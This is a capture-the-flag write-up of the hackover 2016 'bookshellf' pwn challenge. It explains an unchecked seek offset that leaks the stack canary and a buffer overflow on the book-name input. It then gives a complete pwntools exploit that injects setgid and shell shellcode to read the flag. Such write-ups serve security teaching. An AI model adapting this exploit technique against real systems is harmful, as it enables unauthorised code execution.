---
layout: post
title: "hackover 2016: bookshellf (pwn 72)"
author: wolvg, creed
categories: writeup
tags: [cat/pwn, tool/pwntools]
---

* **Category:** pwn
* **Points:** 72
* **Description:**


>
>Our business market analysis told us that the cyber kids of today don't read books anymore. Cyber parents are desperate about their cyber kid's education. Therefore we released a new cyber ebook reader which sends cyber waves directly to the kids brains to make them read electronically. Currently we are in negotiations with many copyright owners to provide a larger library. For now you can read the work by H.P. Lovecraft, which is public cyber domain.

>nc challenges.hackover.h4q.it 31337 

## Write-up
When we start the binary we are presented with a banner and menu.
```
 _              _       _        _ _  __
| |__  ___  ___| |__ __| |_  ___| | |/ _|
| '_ \/ _ \/ _ \ / /(_-< ' \/ -_) | |  _|
|_.__/\___/\___/_\_\/__/_||_\___|_|_|_|
                    with 20% more love!
== main menu
0) list books
1) read book
2) exit
> 
```

First we can list the available books (stored on a folder on the remote) and then read them. In order to read a book we have to enter its name, e.g., dagon.txt. The program then reads 511 bytes of the book into a buffer, prints it, and presents the user with the question wheter the user want to continue reading, stop reading or seek to a specific offset.
This offset is neither checked against the size of the book nor is it checked if it is positive. This means we can read 511 bytes from wherever we want. As the buffer is copied via strncpy we can only read from an adress until a 0-byte is encountered.
Additionally, when entering the name of book we want to read, we can overflow the 'book_to_read' buffer.

Let's checksec:
```
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : FULL
gdb-peda$ 
```
Here's the plan:

1. leak canary and saved rbp
2. overwrite canary with leaked canary, overwrite ret address with rbp+offset, write shellcode on the stack

After some exploit fiddling we get a shell on the remote and, of course, we are here for the flag.

```
$ ls -al
total 32
drwxr-xr-x 4 root root  4096 Oct  6 19:57 .
drwxr-xr-x 4 root root  4096 Oct  6 19:57 ..
-rwxr-sr-x 1 flag flag 10232 Oct  6 19:57 bookshellf
dr-xr-xr-x 2 root root  4096 Oct  6 19:57 library
-rwxr-xr-x 1 root root    68 Oct  6 19:57 run.sh
dr-xr-xr-x 2 root flag  4096 Oct  6 19:57 secret
$ cd secret
$ ls -al
total 12
dr-xr-xr-x 2 root flag 4096 Oct  6 19:57 .
drwxr-xr-x 4 root root 4096 Oct  6 19:57 ..
-r--r----- 1 root flag   62 Oct  6 19:57 flag.txt
$ cat flag.txt
$ whoami
user
```
Ok, it looks like we are not allowed to read the flag. Back to IDA again.
Apparently there is that:
```
[...]    
seteuid(v1);
v2 = getuid();
setegid(v2);
[...]
```

So we have to change the gid to the flag gid.
```
user:x:1000:1000::/home/user/:/usr/sbin/nologin
flag:x:1001:1001::/home/flag/:/usr/sbin/nologin
```

We added the following line to our exploit
```
shellcode += asm(shellcraft.amd64.linux.setgid(1001), arch="amd64")
```
and executed it against the remote. Now we are allowed the read the flag:

```
hackover16{iN_h1s_hOusE_aT_Rlyeh_d3ad_Cthulhu_waItS_drEamIng}
```

Our final exploit:

```python
from pwn import *
import binascii

context.terminal = ['urxvtGDB.sh']
#context.log_level = 'DEBUG'
context.arch = 'amd64'

#p = process('./bookshellf')
p = remote('challenges.hackover.h4q.it', 31337)
p.recvuntil('>')

#gdb.attach(p,
#         'b *0x400fcf')
p.sendline('1')
p.recvuntil('>')

index = '30729'
p.sendline('dagon.txt')

p.recvuntil('>')
p.sendline('s' + index)
p.recvuntil('!\n\n\n')

received = p.recvline()
addr = '\x00' + received[8:13] + '\x00' * 2
addr = addr[::-1]

addr_int = int(binascii.hexlify(addr), 16) + 0x100
print'addr = 0x' + hex(addr_int)

canary = '\x00'
canary += received[0:7]


p.sendline('n') # stop reading
p.recvuntil('>')
p.sendline('1')
p.recvuntil('>')

offset = cyclic_find(0x646d6178)

payload = 'B' * 8   #rbp
payload += p64(addr_int)
shellcode = ''
shellcode += asm(shellcraft.amd64.linux.setgid(1001), arch="amd64")
shellcode += asm(shellcraft.amd64.linux.sh(), arch="amd64")

p.sendline('asdf' + 'D' * (offset - 4) + canary + payload + '\x90' * 0x200 + shellcode)
p.clean_and_log()
p.interactive()
```
